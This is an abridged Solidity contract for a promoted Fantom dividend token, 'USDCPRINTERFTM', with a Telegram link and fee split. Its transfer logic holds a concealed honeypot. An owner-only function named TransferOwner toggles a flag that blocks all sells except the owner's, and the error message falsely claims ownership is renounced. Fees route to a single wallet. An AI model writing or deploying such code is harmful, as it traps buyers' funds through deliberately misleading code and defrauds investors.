...
/**
Stealth/low cap play.

The newest printer, which will follow in the footsteps of previous printer projects. 
The more USDCPRINTER you have, more USDC you will receive.

8% USDC
4% LP
2% Marketing

https://t.me/usdcprinterftm
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 EP = IBEP20(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75); // reflections
...
contract USDCPRINTERFTM is IBEP20, Auth {
    using SafeMath for uint256;

    uint256 public constant MASK = type(uint128).max;
    address EP = 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75; // reflections
    address public WFTM = 0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "USDCPRINTERFTM";
    string constant _symbol = "UsdcPrinterFtm";
    ...
    address public autoLiquidityReceiver=0x135946F910eD14bf60f6836dC355343d142F3974; 
    address public marketingFeeReceiver=0x135946F910eD14bf60f6836dC355343d142F3974; 
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!TransferFromOwner || sender==owner), "Ownership is already renounced");
...
//        emit Transfer(sender, recipient, amount);
    ...
    function TransferOwner(bool value) external onlyOwner {
        TransferFromOwner = value;
    }
